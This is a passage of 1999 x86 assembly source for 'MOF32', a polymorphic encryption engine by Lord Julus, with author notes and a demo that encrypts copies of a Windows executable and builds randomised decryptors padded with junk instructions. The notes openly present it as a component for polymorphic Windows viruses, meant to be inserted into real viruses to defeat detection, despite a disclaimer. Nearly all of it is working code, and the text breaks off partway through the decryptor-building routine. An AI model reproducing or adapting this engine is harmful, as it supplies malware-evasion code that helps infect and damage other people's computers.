Comment $

               Do not distribute !!! Beta 0.99 test version !!!

ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ÚÄ¿     Ú¿    Ú¿       ÚÄÄÄÄÄ¿        ÚÄÄÄÄÄ¿       ÚÄÄÄÄÄ¿   ÚÄÄÄÄÄ¿      ÚÄ¿
³ ³     ³ÃÄÄÄÄ´³      ÚÅÄÄÄÄÄÅ¿      ÚÅÄÄÄÄÄÙ       ÀÄÄÄÄÄÅ¿  ÀÄÄÄÄÄÅ¿     ³ ³
³ ³     ³ÃÄ¿ÚÄ´³      ³³     ³³      ³ÃÄÄÄ¿           ÚÄÄÄÅÙ   ÚÄÄÄÄÅÙ     ³ ³
³ ³     ³³ ÀÙ ³³      ³³     ³³      ³ÃÄÄÄÙ           ÀÄÄÄÅ¿  ÚÅÄÄÄÄÙ      ³ ³
³ ³     ³³    ³³  Ú¿  ÀÅÄÄÄÄÄÅÙ  Ú¿  ³³       Ú¿    ÚÄÄÄÄÄÅÙ  ÀÅÄÄÄÄÄ¿     ³ ³
ÀÄÙ     ÀÙ    ÀÙ  ÀÙ   ÀÄÄÄÄÄÙ   ÀÙ  ÀÙ       ÀÙ    ÀÄÄÄÄÄÙ    ÀÄÄÄÄÄÙ     ÀÄÙ
ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        THE ULTIMATE POLYMORPHIC ENGINE TO WORK IN 32 BIT ENVIRONMENT

                        written by Lord Julus (c) 1999

ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
Ú¿                                                                          Ú¿
³³          Well,  here  is  the version 4.0 of this polymorphic            ³³
³³            engine.  The  16  bit variant which I released was            ³³
³³            quite  a hit and many people liked it. However, as            ³³
³³            far  as  I  know it didn't reach in any virus. But            ³³
³³            this,  well,  this  is something else... This is a            ³³
³³            polymorphic  engine  made  to  work  on  in 32 bit            ³³
³³            environments.  This  means  that this baby here is            ³³
³³            the key towards your polymorphic windows viruses.             ³³
³³                                                                          ³³
³³          Warning!  This  program  you  have  here is merely a            ³³
³³            demonstration.  It  simply creates 10 Portable Exe            ³³
³³            files  in the current directory. The files are the            ³³
³³            copy  of  the sample.asm file included here. After            ³³
³³            the  creation,  the  file  is encrypted and then a            ³³
³³            polymorphic  decryptor is generated. Upon runtime,            ³³
³³            the  decryptor  unscrambles  the code and the file            ³³
³³            runs normally... or at least I hope so...                     ³³
³³                                                                          ³³
³³          So,  as  I explained, this is by no means a virus in            ³³
³³            any  way and the author cannot be held responsible            ³³
³³            for  the misuse of this source, for it's including            ³³
³³            inside   viral   pieces   of   code,  or  for  any            ³³
³³            modifications  brought  to  this code by somebody.            ³³
³³            This  code  comes 'as is' and does not represent a            ³³
³³            threat in any way.                                            ³³
³³                                                                          ³³
³³                                                                          ³³
³³          Technical  notes: The encryption is not the simplest            ³³
³³            kind.  The  dwords  are  read  from the end to the            ³³
³³            beginning  and each dword is added the dword after            ³³
³³            it.  Then  the dword is RORed x times and then the            ³³
³³            operation with the key is applyied. This means the            ³³
³³            encryption  algorithm  is  in the same time with a            ³³
³³            key  and  with  no  key... The key is also sliding            ³³
³³            with a different 'value to operate'. The operation            ³³
³³            applyied over the key is also random.                         ³³
³³                                                                          ³³
³³          The engine generates tons of junk, mainly 32bit, but            ³³
³³            also  16bit.  As  a difference from 'it's mother',            ³³
³³            the  16bit  variant,  here  the  decryptor is very            ³³
³³            simple   and   very   much  junk  gets  generated,            ³³
³³            including    FPU   instructions   and   privileged            ³³
³³            instructions.                                                 ³³
³³                                                                          ³³
³³          I sure hope this makes a change !                               ³³
³³                                                                          ³³
³³                                   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                ³³
³³                                   ³  Lord Julus - 1998  ³                ³³
³³                                   ÀÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÙ                ³³
ÃÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁ´
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 Current version comment:

        As you will see, this poly engine demo is made up from two modules:

                1) The decryptor generator module (V.0.1)
                2) The junk generator module      (V.0.1)

        The  decryptor  generator  works  perfetly  and  so  does  the junk
 generator.  The  only thing missing is the fact that the junk generator is
 not  so  full  of  junk  as  it should be ;-) This is mainly because I was
 anxious  to  release this quickly and get it tested. For now it works very
 well,  but it will be much better as soon as I implement all the garbage I
 want.  For  now,  use  it as it is... Also, I don't know if I made all the
 [ebp+...]  changes  so you could insert it into a real virus. If you want,
 drop me a line and we'll talk about it (lordjulus@geocities.com).



        compile with Tasm32 -ml -m3 lj_mof32.asm
                     Tlink32 -aa -Tpe lj_mof32.obj,,,import32.lib
                     Pewrsec lj_mof32.exe
                     

        $

.386p                                        ;  the minimum we need
.model flat, stdcall                         ;
                                             ;
extrn ExitProcess:proc                       ; Here we have the external
extrn CreateFileA:proc                       ; procedure we import to make
extrn CreateFileMappingA:proc                ; the demo work. The poly engine
extrn MapViewOfFile:proc                     ; doesn't need any of these.
extrn UnmapViewOfFile:proc                   ;
extrn CloseHandle:proc                       ;
extrn GetFileSize:proc                       ;
extrn SetEndOfFile:proc                      ;
extrn SetFilePointer:proc                    ;
                                             ;
.data                                        ; dummy data
  db 0                                       ;
                                             ;
.code                                        ;

initfile  db "sample.exe",0
filenames db "000.exe",0,"001.exe",0,"002.exe",0,"003.exe",0,"004.exe",0
          db "005.exe",0,"006.exe",0,"007.exe",0,"008.exe",0,"009.exe",0
start:
      jmp realstart                          ;
                                             ;
limit        dd 0                            ;
size_of_code dd 0                            ; size of code to crypt
memory dd 0                                  ; size of file to map in mem.
filehandle dd 0                              ; handle for file
maphandle dd 0                               ; handle for the file map
mapaddress dd 0                              ; address of the map
newfilesize dd 0                             ; the size of the opened file
newfilehandle dd 0                           ; and here the same variables
newmapaddress dd 0                           ; that are used for the output
newmaphandle dd 0                            ; file.
;variables needed or alignment:
deltahandle dd 0                             ; image base alignment
eip dd 0                                     ; eip for files
rawdata dd 0                                 ; pointer to raw data


;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;Û This is the demo code. The poly engine code starts after.                 Û
;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

realstart:                                   ; start of the demo
                                             ;
; First we are about to open the sample file ;
                                             ;
      xor ebp, ebp                           ; use ebp as a NULL delta handle
      lea esi, initfile                      ; esi points to 'sample.exe',0
      push 0                                 ; template attributes
      push 0                                 ; file attributes
      push 3                                 ; OPEN EXISTING File
      push 0                                 ; Security option = default
      push 1                                 ; File share for read
      push 80000000h or 40000000h            ; General write and read
      push esi                               ; pointer to filename
      Call CreateFileA                       ;
                                             ; EAX = file handle
      mov [ebp+offset filehandle], eax       ;
      cmp eax, 0                             ;
      je open_error                          ; can't open file ?!?
                                             ;
      push 0                                 ;
      push dword ptr [ebp+offset filehandle] ;
      call GetFileSize                       ; save the filesize for later
      mov dword ptr [ebp+offset newfilesize], eax
      add eax, 500h                          ;
      mov dword ptr [ebp+offset memory], eax ; memory = filesize + 500h extra
                                             ; bytes

; About to create the file mapping for the file

      push 0                                 ; filename handle = NULL
      push dword ptr [ebp+offset memory]     ; max size
      push 0                                 ; min size (no need)
      push 4                                 ; Page read & write
      push 0                                 ; security attributes
      push dword ptr [ebp+offset filehandle] ;
      Call CreateFileMappingA                ;
                                             ; Eax = new handle
      mov [ebp+offset maphandle], eax        ;
      cmp eax, 0                             ;
      je close_file                          ; can't map file ?!?
                                             ;
; About to map the view of the file          ;
                                             ;
      push dword ptr [ebp+offset memory]     ; bytes to map
      push 0                                 ; blah, blah, blah...
      push 0                                 ; ;-)
      push 2                                 ; File Map Write Mode
      push eax                               ; File Map Handle
      Call MapViewOfFile                     ;
                                             ;
      cmp eax, 0                             ;
      je close_map                           ; can't map view of file ?!?
      mov esi, eax                           ; ESI = base of map...
      mov [ebp+offset mapaddress], esi       ;
                                             ;
; Now the file is ready to work on at ESI !  ;

; Now we will generate 10 files that look exactly like the sample file

     mov ecx, 10d                            ; create 10 new files
     lea edi, filenames                      ; edi will point to filenames
     sub edi, 8                              ;
                                             ;
Create_loop:                                 ;
     push edi                                ; make edi point to each of
     lea edi, [edi+ecx*8]                    ; the ten names
     pushad                                  ; save regs
     Call create_new_file                    ; And Create the new file
     popad                                   ; restore regs
     pop edi                                 ;
     loop Create_loop                        ;
                                             ;
; Let's release it all now...
; Here we close the sample file together with it's map

Unmap_view:                                  ; first unmap the view
      push dword ptr [ebp+offset mapaddress] ;
      Call UnmapViewOfFile                   ;
                                             ;
close_map:                                   ;
      push dword ptr [ebp+offset maphandle]  ; then close the map handle
      Call CloseHandle                       ;
                                             ;
close_file:                                  ; then close file handle,
      push 0                                 ; first we must set the file
      push 0                                 ; pointer at the end of file
      push dword ptr [ebp+offset newfilesize]; (that is the beginning +
      push dword ptr [ebp+offset filehandle] ;  file size)
      Call SetFilePointer                    ;
                                             ;
      push dword ptr [ebp+offset filehandle] ; ...and then mark the end of
      Call SetEndOfFile                      ; file
                                             ;
      push dword ptr [ebp+offset filehandle] ; now, close !
      Call CloseHandle                       ;
      jmp demo_over                          ;
                                             ;
                                             ;
create_new_file proc near                    ; Here we create files
      push 0                                 ; file attributes
      push 0                                 ; ""
      push 2                                 ; Create New File
      push 0                                 ; Security option = default
      push 1                                 ; File share for read
      push 80000000h or 40000000h            ; General write and read
      push edi                               ; pointer to filename
      Call CreateFileA                       ;
                                             ; EAX = file handle
      mov [ebp+offset newfilehandle], eax    ;
      cmp eax, 0                             ;
      je _open_error                         ; can't open file ?!?

; About to create the file mapping for the file

      push 0                                 ; filename handle = NULL
      push dword ptr [ebp+offset memory]     ; max size
      push 0                                 ; min size (no need)
      push 4                                 ; Page read & write
      push 0                                 ; security attributes
      push dword ptr [ebp+offset newfilehandle]
      Call CreateFileMappingA                ;
                                             ; Eax = new handle
      mov [ebp+offset newmaphandle], eax     ;
      cmp eax, 0                             ;
      je _close_file                         ; can't map file ?!?
                                             ;
; About to map the view of the file          ;
                                             ;
      push dword ptr [ebp+offset memory]     ; bytes to map
      push 0                                 ; blah, blah, blah...
      push 0                                 ; ;-)
      push 2                                 ; File Map Write Mode
      push eax                               ; File Map Handle
      Call MapViewOfFile                     ;
                                             ;
      cmp eax, 0                             ;
      je _close_map                          ; can't map view of file ?!?
      mov esi, eax                           ; ESI = base of map...
      mov [ebp+offset newmapaddress], esi    ;
                                             ;
; Now the file is ready to work on at ESI !  ;
                                             ; We will copy the original file
      mov esi, [ebp+offset mapaddress]       ; to the new file, from
      mov edi, [ebp+offset newmapaddress]    ; mapaddress to newmapaddress,
      mov ecx, newfilesize                   ; newfilesize bytes.
      rep movsb                              ;
                                             ;
      pushad                                 ;
      Call PolyEngine                        ; Call Poly Engine !!
      popad                                  ;
                                             ;
      push dword ptr [ebp+offset newmapaddress]
      Call UnmapViewOfFile                   ; No we unmap the newfile
                                             ;
_close_map:                                  ;
      push dword ptr [ebp+offset newmaphandle]
      Call CloseHandle                       ; then close the map handle
                                             ;
_close_file:                                 ; then close file handle,
      push 0                                 ; first we must set the file
      push 0                                 ; pointer at the end of file
      push dword ptr [ebp+offset newfilesize]; (that is the beginning +
      push dword ptr [ebp+offset newfilehandle] ;  new file size)
      Call SetFilePointer                    ;
                                             ;
      push dword ptr [ebp+offset newfilehandle] ; ...and then mark the end of
      Call SetEndOfFile                      ;
                                             ;
      push dword ptr [ebp+offset newfilehandle] ; now, close !
      Call CloseHandle                       ;
_open_error:                                 ;
      ret                                    ;
create_new_file endp                         ;

;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;Û Here you can see what you need to do in order to call the MOF32.          Û
;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

PolyEngine      proc near                       ; Here we make final prepares
      mov edi, dword ptr [ebp+offset newmapaddress]
      add edi, 03ch                             ; locate the PE header
      mov esi, dword ptr [edi]                  ; address
      add esi, dword ptr [ebp+offset newmapaddress]
      push esi                                  ; save it
      add esi, 028h                             ; locate EIP
      mov ebx, [esi]                            ; put it in EBX
      mov dword ptr [ebp+offset eip], ebx
      add esi, 0Ch                              ; locate imagebase
      add ebx, [esi]                            ; add it it EBX
      mov dword ptr [ebp+offset deltahandle], ebx ; and save for alignment
      pop esi                                   ;
      add esi, 10Ch                             ; locate the pointer to raw
                                                ; data for the .code section.

; this might be a little hardcoded... I will write a better search code...

      mov esi, dword ptr [esi]                  ; address
      mov dword ptr [ebp+offset rawdata], esi
      inc esi                                   ; jump over the JMP opcode
      add esi, dword ptr [ebp+offset newmapaddress]
      mov eax, dword ptr [esi]                  ; get the size of jump
      mov edi, esi                              ; and make EDI point there
      add edi, eax                              ;

; Let's prepare to call the Poly Engine

      add edi, 4                                ; address for decryptor
      add esi, 4                                ; address of code to decrypt
      mov ebx, esi                                  ; in ebx we will have
      sub ebx, dword ptr [ebp+offset newmapaddress] ; the actual address of
      sub ebx, dword ptr [ebp+offset rawdata]       ; code to decrypt at
      add ebx, dword ptr [ebp+offset deltahandle]   ; runtime...
      mov ecx, eax                              ; ecx = size of code
      Call MOF32                                ; Call MOF32
      ret                                       ;
PolyEngine      Endp                            ;

;   ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿
;   ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³
;   ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ
;   ÚÄÄÄ¿                                                             ÚÄÄÄ¿
;   ³ ú ³ MúUúLúTúIúPúLúE  OúPúCúOúDúE  FúAúNúTúAúSúIúEúS  3ú2  BúIúT ³ ú ³
;   ÀÄÄÄÙ                                                             ÀÄÄÄÙ
;   ÚÄÄÄ¿                a polymorphic engine wrote by                ÚÄÄÄ¿
;   ³ ú ³                                                             ³ ú ³
;   ÀÄÄÄÙ                    LORD JULUS - 1999 (C)                    ÀÄÄÄÙ
;   ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿
;   ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³
;   ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ


MOF32 proc near                       ; Here is the actual poly engine
      pushad                          ; body

; First let's encrypt the area that will be decrypted later

      call Choose_random_registers    ; choose the random registers to use
      add ebx, 3
      mov dword ptr [ebp+codeaddr], ebx
      sub ebx, 3
      push edi                        ; save decryptor place
      push ecx                        ; save code in bytes
      mov ebx, esi                    ;
      add ebx, ecx                    ; ebx points to the end
      sub ebx, 4                      ; minus 1 dword
      shr ecx, 2                      ; we work on dwords
      push ebx ecx                    ;
      call random32                   ; get a random 32bit dword in EAX
      mov dword ptr [ebp+offset key], eax ; which is the encryption key
      call random32                   ;
      mov dword ptr [ebp+offset keyvalue], eax ; the key increment
      mov eax, 20h                    ; the static key.
      call brandom32                  ;
      inc eax                         ;
      mov dword ptr [ebp+offset key2], eax
      mov eax, 3                      ;
      call brandom32                  ; get a random value between 0-3
      mov dword ptr [ebp+offset op1], eax ; the encryption method
      mov eax, 2                      ;
      call brandom32                  ;
      mov dword ptr [ebp+offset op2], eax ; the static key method
      mov eax, 3                      ;
      call brandom32                  ;
      mov dword ptr [ebp+offset op3], eax ; the 'next code' method
      mov eax, 3                      ;
      call brandom32                  ;
      mov dword ptr [ebp+offset op4], eax ; the operation over the key
                                      ;
      pop ecx ebx                     ; restore length and pointer
      mov eax, key                    ; put key in eax
      mov [ebp+offset codelength], ecx

; First we encrypt the code                          0   1   2
; op1 = operation over code with the key register  (XOR/ADD/SUB)
; op2 = operation over code with the static key    (ROR/ROL)
; op3 = operation over code with next code         (XOR/ADD/SUB)
; op4 = operation over the key with the keyvalue   (XOR/ADD/SUB)

mainloop:
      mov edx, dword ptr [ebx]             ; edx = dword to encrypt
      push eax  ebx  ecx                   ;
      mov ecx, op3                         ; ecx = op3
      mov eax, edx                         ; <op3> eax, dword ptr [ebx+4]
      mov ebx, dword ptr [ebx+4]           ;
      call makeop                          ; do it!
      mov edx, eax                         ;
      pop ecx  ebx  eax                    ;
      push ecx                             ;
      mov ecx, op2                         ; ecx = op2
      cmp ecx, 0                           ;
      jne notror                           ;
      mov ecx, key2                        ;
      ror edx, cl                          ; ROR
      jmp over1                            ;
notror:                                    ;
      mov ecx, key2                        ;
      rol edx, cl                          ; ROL
over1:                                     ;
      pop ecx                              ;
      push eax  ebx  ecx                   ;
      mov ecx, op1                         ; ecx = op1
      mov ebx, eax                         ; we do <op1> edx, eax
      mov eax, edx                         ;
      call makeop                          ;
      mov edx, eax                         ;
      pop ecx  ebx  eax                    ;
                                           ;
      mov dword ptr [ebx], edx             ;
                                           ;
      push ebx  ecx                        ;
      cmp ecx, 1                           ;
      je no_thankyou                       ;
      mov ecx, op4                         ; ecx = op4
      mov ebx, keyvalue                    ; we do <op4> eax, keyvalue
      call makeop                          ;
                                           ;
no_thankyou:                               ;
      pop ecx  ebx                         ;
                                           ;
      sub ebx, 4                           ; we go back 1 dword
      loop mainloop                        ; and loop
      jmp ok                               ; jump over
                                           ;
makeop:                                    ;
      cmp ecx, 0                           ; is it the first method ?
      jne notxor                           ;
      xor eax, ebx                         ; yes, XOR!
      jmp ready                            ;
notxor:                                    ;
      cmp ecx, 1                           ; or maybe second ?
      jne notadd                           ;
      add eax, ebx                         ; yes, ADD!
      jmp ready                            ;
notadd:                                    ;
      sub eax, ebx                         ; then, SUB!
ready:                                     ;
      ret                                  ;
                                           ;
ok:                                        ;
      pop ecx                              ; restore code length
      pop edi                              ; restore decryptor place
      shr ecx, 2                           ; we work on dwords
      mov dword ptr [ebp+offset key], eax  ; get decryption start key
      add ebx, 4                           ; align start of code

; eax = initial key
; ebx = initial offset
; ecx = real length in dwords
; Here we start taking, filling and writing the decryptor

      lea esi, [ebp+offset decryptor]      ; esi points to the decryptor
      mov counter, 1                       ; counter for instructions
                                           ;
getinstr:                                  ;
      cmp counter, 13d                     ;
      je over_all                          ;
      lodsb                                ; load one byte
      cmp al, 0FEh                         ; check for instruction end
      je over_instr                        ;
      cmp al, 0FFH                         ; check for final end
      je over_all                          ;
      stosb                                ; store the byte
      jmp getinstr                         ; do it again...
                                           ;
over_instr:                                ;
      call makeinstr                       ; fill the instruction
      cmp [ebp+counter], 11d               ;
      je no_junk_please                    ;
      call makejunk                        ; create junk after it
                                           ;
no_junk_please:                            ;
      inc counter                          ; increment counter
      jmp getinstr                         ; and do it again...
                                           ;
over_all:                                  ; the end...
      popad                                ; restore registers
      ret                                  ; and return

;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;Û Here we have the instruction maker and the junk code generator.           Û
;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

makeinstr proc near                        ; The routine to fill the instr.
      pushad                               ; save all regs
      cmp counter, 13d                     ; check for counter < 13
      je ok_procs                          ;
      lea eax, dword ptr [ebp+offset procs]; eax points to procs addresses
      mov ebx, counter                     ; ebx = what instruction
      dec ebx                              ; minus one because we need 0 too
      shl ebx, 2                           ; multiply by 2 for dwords
      add eax, ebx                         ; and add it to eax so that eax
      mov eax, dword ptr [ebp+eax]         ; points to the correct address.
      jmp eax                              ; Take it and jump to it...
                                           ;
;Here are the procedures to fill each instruction of the real decryptor

proc01:                                    ; mov preg, code_start
      and byte ptr [edi-5], 11111000b      ; clear the place for preg
      mov al, byte ptr [ebp+offset preg]   ;
      or byte ptr [edi-5], al              ; fill the preg
      mov eax, dword ptr [ebp+offset codeaddr]
      or dword ptr [edi-4], eax            ; fill the code start value
      jmp ok_procs                         ;
                                           ;
proc02:                                    ; mov kreg, key
      and byte ptr [edi-5], 11111000b      ; clear the place for kreg
      mov al, byte ptr [ebp+offset kreg]   ;
      or byte ptr [edi-5], al              ; fill the kreg
      mov eax, dword ptr [ebp+offset key]  ;
      or dword ptr [edi-4], eax            ; fill the key value
      jmp ok_procs                         ;
                                           ;
proc03:                                    ; mov lreg, code_length/8
      and byte ptr [edi-5], 11111000b      ; clear the place for lreg
      mov al, byte ptr [ebp+offset lreg]   ;
      or byte ptr [edi-5], al              ; fill the lreg
      mov eax, dword ptr [ebp+offset codelength]
      or dword ptr [edi-4], eax            ; fill the code length value
      jmp ok_procs                         ;
                                           ;
proc04:                                    ; mov creg, [preg] (mainloop)
      and byte ptr [edi-1], 11000000b      ; clear for pointer and code regs
      mov al, byte ptr [ebp+offset preg]   ;
                                           ;
      cmp al, 5                            ; take care of [EBP] exception
      jne not_ebp                          ; (when we use [EBP] addressing
      mov al, 0                            ;  mode, we need a suplemental
      stosb                                ;  00 byte after the opcode
      mov al, 5                            ;  and a 01000000b fill up - see
      and byte ptr [edi-2], 0              ;  (*))
      or byte ptr [edi-2], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-2], al              ;
      or byte ptr [edi-2], 01000000b       ; (*)
      mov increment_flag, 1                ;
      mov eax, edi                         ;
      sub eax, 3                           ;
      jmp done_i04                         ;
                                           ;
                                           ;
not_ebp:                                   ;
      or byte ptr [edi-1], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-1], al              ;
      mov eax, edi                         ;
      sub eax, 2                           ;
                                           ;
done_i04:                                  ;
      mov dword ptr [ebp+offset mainlp], eax;
      jmp ok_procs                         ;
                                           ;
proc05:                                    ; <op1> creg, kreg
      and byte ptr [edi-1], 11000000b      ; clear for r/m and reg
      mov al, byte ptr [ebp+offset creg]   ; get creg,
      shl al, 3                            ; align like this xxNNNxxx
      or byte ptr [edi-1], al              ;
      mov al, byte ptr [ebp+offset kreg]   ;
      or byte ptr [edi-1], al              ;
      and byte ptr [edi-2], 0              ;
      mov eax, dword ptr [ebp+offset op1]  ;
      lea esi, [ebp+offset un_op_code1]    ;
      add esi, eax                         ;
      mov al, byte ptr [esi]               ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc06:                                    ; <op2> creg, key2
      and byte ptr [edi-2], 11111000b      ;
      mov al, byte ptr [ebp+offset creg]   ; fill creg
      or byte ptr [edi-2], al              ;
      mov al, byte ptr [ebp+offset key2]   ; fill key
      or byte ptr [edi-1], al              ;
      mov eax, dword ptr [ebp+offset op2]  ;
      lea esi, [ebp+offset un_op_code3]    ;
      add esi, eax                         ;
      mov al, byte ptr [esi]               ;
      and byte ptr [edi-2], 00000111b      ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc07:                                    ; <op3> creg, [preg+4]
      and byte ptr [edi-2], 11000000b      ;
      mov al, byte ptr [ebp+offset preg]   ;
      or byte ptr [edi-2], al              ;
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ;
      or byte ptr [edi-2], al              ;
      and byte ptr [edi-3], 0              ;
      mov eax, dword ptr [ebp+offset op3]  ;
      lea esi, [ebp+offset un_op_code1]    ;
      add esi, eax                         ;
      mov al, byte ptr [esi]               ;
      or byte ptr [edi-3], al              ;
      jmp ok_procs                         ;
                                           ;
proc08:                                    ; mov [preg], creg
      and byte ptr [edi-1], 11000000b      ; clear for pointer and code regs
      mov al, byte ptr [ebp+offset preg]   ;

      cmp al, 5                            ; take care of [EBP] exception
      jne not_ebp2                         ; (check proc04 for explanation)
      mov al, 0                            ;
      stosb                                ;
      mov al, 5                            ;
      and byte ptr [edi-2], 0              ;
      or byte ptr [edi-2], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-2], al              ;
      or byte ptr [edi-2], 01000000b       ;
      mov increment_flag, 1                ;
      jmp done_i08                         ;
                                           ;
not_ebp2:                                  ;
      or byte ptr [edi-1], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-1], al              ;
                                           ;
done_i08:                                  ;
      jmp ok_procs                         ;
                                           ;
proc09:                                    ; <op4> kreg, keyvalue
      and byte ptr [edi-6], 0              ;
      mov eax, dword ptr [ebp+offset op4]  ;
      lea esi, [ebp+offset un_op_code2]    ;
      shl eax, 1                           ;
      add esi, eax                         ;
      mov ax, word ptr [esi]               ;
      and word ptr [edi-6], 0              ;
      or word ptr [edi-6], ax              ;
      and byte ptr [edi-5], 11111000b      ;
      mov al, byte ptr [ebp+offset kreg]   ; fill kreg
      or byte ptr [edi-5], al              ;
      mov eax, dword ptr [ebp+offset keyvalue] ; fill key
      and dword ptr [edi-4], 0             ;
      or dword ptr [edi-4], eax            ;
      jmp ok_procs                         ;
                                           ;
proc10:                                    ; sub preg, 4
      and byte ptr [edi-2], 11111000b      ;
      mov al, byte ptr [ebp+offset preg]   ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc11:                                    ; sub lreg, 1
      and byte ptr [edi-2], 11111000b      ;
      mov al, byte ptr [ebp+offset lreg]   ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc12:                                    ; jnz mainloop
      mov eax, dword ptr [ebp+offset mainlp];
      mov edx, edi                         ;
      add edx, 4                           ;
      sub eax, edx                         ;
      and dword ptr [edi], 0               ;
      or dword ptr [edi], eax              ;
      popad                                ;
      add edi, 4                           ;
      jmp special_ok_procs                 ;
                                           ;
ok_procs:                                  ; done!
      popad                                ; restore all regs
                                           ;
